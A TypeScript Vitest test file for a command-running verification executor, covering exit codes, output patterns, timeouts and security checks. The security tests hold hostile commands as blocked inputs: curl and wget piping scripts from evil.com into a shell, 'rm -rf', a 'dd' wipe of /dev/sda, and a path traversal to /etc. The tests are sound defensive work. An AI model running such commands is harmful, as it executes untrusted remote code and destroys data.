/**
 * Tests for CommandStrategyExecutor
 * Universal Verification Strategy (UVS) Phase 3
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import type { Feature } from "../../src/types.js";
import type { CommandVerificationStrategy } from "../../src/verifier/types/index.js";

// Use vi.hoisted to define mocks that will be available when vi.mock factories run
const { mockExecAsync } = vi.hoisted(() => ({
  mockExecAsync: vi.fn(),
}));

// Mock modules
vi.mock("node:child_process", () => ({
  exec: vi.fn(),
}));

vi.mock("node:util", () => ({
  promisify: vi.fn(() => mockExecAsync),
}));

// Import after mocks are defined
import { CommandStrategyExecutor, commandStrategyExecutor } from "../../src/strategies/command-strategy.js";
import { defaultRegistry } from "../../src/strategy-executor.js";

// Base feature for testing
const baseFeature: Feature = {
  id: "test.feature",
  description: "Test feature",
  module: "test",
  priority: 1,
  status: "failing",
  acceptance: ["Acceptance criterion"],
  dependsOn: [],
  supersedes: [],
  tags: [],
  version: 1,
  origin: "manual",
  notes: "",
};

describe("CommandStrategyExecutor", () => {
  let executor: CommandStrategyExecutor;

  beforeEach(() => {
    executor = new CommandStrategyExecutor();
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe("type property", () => {
    it("should have type 'command'", () => {
      expect(executor.type).toBe("command");
    });
  });

  describe("execute", () => {
    it("should execute command successfully", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "Command executed successfully",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "echo",
        args: ["hello"],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.output).toContain("Command executed successfully");
      expect(result.duration).toBeGreaterThanOrEqual(0);
    });

    it("should handle command failure with non-zero exit code", async () => {
      const error = new Error("Command failed") as any;
      error.code = 1;
      error.stdout = "Error output";
      error.stderr = "Some error";
      mockExecAsync.mockRejectedValue(error);

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "false",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.exitCode).toBe(1);
    });

    it("should support custom expected exit code", async () => {
      const error = new Error("Command exited with 2") as any;
      error.code = 2;
      error.stdout = "Expected output";
      error.stderr = "";
      mockExecAsync.mockRejectedValue(error);

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "test",
        expectedExitCode: 2,
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.details?.exitCode).toBe(2);
      expect(result.details?.expectedExitCode).toBe(2);
    });

    it("should support array of expected exit codes", async () => {
      const error = new Error("Command exited with 3") as any;
      error.code = 3;
      error.stdout = "";
      error.stderr = "";
      mockExecAsync.mockRejectedValue(error);

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "special",
        expectedExitCode: [0, 2, 3],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.details?.exitCodeMatch).toBe(true);
    });

    it("should support stdoutPattern matching", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "BUILD SUCCESS\nAll tests passed",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "make",
        args: ["build"],
        stdoutPattern: "BUILD SUCCESS",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.details?.stdoutPatternMatch).toBe(true);
    });

    it("should support expectedOutputPattern as alias for stdoutPattern", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK: version 1.2.3",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "version",
        expectedOutputPattern: "version \\d+\\.\\d+\\.\\d+",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.details?.stdoutPatternMatch).toBe(true);
    });

    it("should fail when stdoutPattern does not match", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "BUILD FAILED",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "make",
        stdoutPattern: "BUILD SUCCESS",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.stdoutPatternMatch).toBe(false);
    });

    it("should support stderrPattern matching", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "",
        stderr: "WARNING: deprecated feature used",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "lint",
        stderrPattern: "WARNING:.*deprecated",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.details?.stderrPatternMatch).toBe(true);
    });

    it("should fail when stderrPattern does not match", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "",
        stderr: "ERROR: something went wrong",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "lint",
        stderrPattern: "WARNING:",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.stderrPatternMatch).toBe(false);
    });

    it("should support notPatterns (negative assertions)", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "All tests passed successfully",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "test",
        notPatterns: ["ERROR", "FAILED", "Exception"],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.details?.notPatternsFailed).toBe(false);
    });

    it("should fail when notPattern matches", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "Running tests...\nERROR: test failed",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "test",
        notPatterns: ["ERROR", "FAILED"],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.notPatternsFailed).toBe(true);
      expect(result.details?.failedNotPattern).toBe("ERROR");
    });

    it("should use custom environment variables", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "echo",
        env: { CUSTOM_VAR: "custom_value", NODE_ENV: "test" },
      };

      await executor.execute("/project", strategy, baseFeature);

      expect(mockExecAsync).toHaveBeenCalled();
      const calledArgs = mockExecAsync.mock.calls[0];
      expect(calledArgs[1]?.env?.CUSTOM_VAR).toBe("custom_value");
      expect(calledArgs[1]?.env?.NODE_ENV).toBe("test");
      expect(calledArgs[1]?.env?.CI).toBe("true");
    });

    it("should use custom working directory", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "ls",
        cwd: "subdir",
      };

      await executor.execute("/project", strategy, baseFeature);

      expect(mockExecAsync).toHaveBeenCalled();
      const calledArgs = mockExecAsync.mock.calls[0];
      expect(calledArgs[1]?.cwd).toContain("subdir");
    });

    it("should handle timeout error", async () => {
      const error = new Error("Timeout") as any;
      error.killed = true;
      error.signal = "SIGTERM";
      error.stdout = "";
      error.stderr = "";
      mockExecAsync.mockRejectedValue(error);

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "sleep",
        args: ["100"],
        timeout: 5000,
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.output).toContain("timed out");
      expect(result.details?.reason).toBe("timeout");
    });

    it("should use default timeout of 60000ms", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "test",
      };

      await executor.execute("/project", strategy, baseFeature);

      expect(mockExecAsync).toHaveBeenCalled();
      const calledArgs = mockExecAsync.mock.calls[0];
      expect(calledArgs[1]?.timeout).toBe(60000);
    });

    it("should escape arguments with special characters", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "echo",
        args: ["hello world", "test$var", 'say "hi"'],
      };

      await executor.execute("/project", strategy, baseFeature);

      expect(mockExecAsync).toHaveBeenCalled();
      const calledArgs = mockExecAsync.mock.calls[0];
      expect(calledArgs[0]).toContain('"hello world"');
      expect(calledArgs[0]).toContain('"test$var"');
    });
  });

  describe("security validation", () => {
    it("should block cwd outside project root", async () => {
      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "ls",
        cwd: "../../../etc",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.reason).toBe("security-violation");
      expect(result.output).toContain("within project root");
    });

    it("should block dangerous rm -rf command", async () => {
      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "rm -rf /tmp",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.reason).toBe("security-violation");
      expect(result.output).toContain("dangerous pattern");
    });

    it("should block curl pipe to bash", async () => {
      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "curl http://evil.com/script.sh | bash",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.reason).toBe("security-violation");
    });

    it("should block wget pipe to shell", async () => {
      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "wget -O- http://evil.com | sh",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.reason).toBe("security-violation");
    });

    it("should block dd to device", async () => {
      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "dd if=/dev/zero of=/dev/sda",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.reason).toBe("security-violation");
    });

    it("should allow safe commands", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "file1.txt\nfile2.txt",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "ls",
        args: ["-la"],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
    });

    it("should allow cwd within project root", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "test",
        cwd: "src/utils",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
    });
  });

  describe("return value details", () => {
    it("should include command in details", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "echo",
        args: ["hello"],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.details?.command).toBe("echo hello");
    });

    it("should include cwd in details", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "pwd",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.details?.cwd).toBe("/project");
    });

    it("should include exit code information", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: CommandVerificationStrategy = {
        type: "command",
        required: true,
        command: "true",
        expectedExitCode: 0,
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.details?.exitCode).toBe(0);
      expect(result.details?.expectedExitCode).toBe(0);
      expect(result.details?.exitCodeMatch).toBe(true);
    });
  });
});

describe("commandStrategyExecutor singleton", () => {
  it("should be a CommandStrategyExecutor instance", () => {
    expect(commandStrategyExecutor).toBeInstanceOf(CommandStrategyExecutor);
  });

  it("should have type 'command'", () => {
    expect(commandStrategyExecutor.type).toBe("command");
  });
});

describe("defaultRegistry integration", () => {
  it("should have command executor registered", () => {
    expect(defaultRegistry.has("command")).toBe(true);
  });

  it("should return commandStrategyExecutor for 'command' type", () => {
    const executor = defaultRegistry.get("command");
    expect(executor).toBe(commandStrategyExecutor);
  });
});
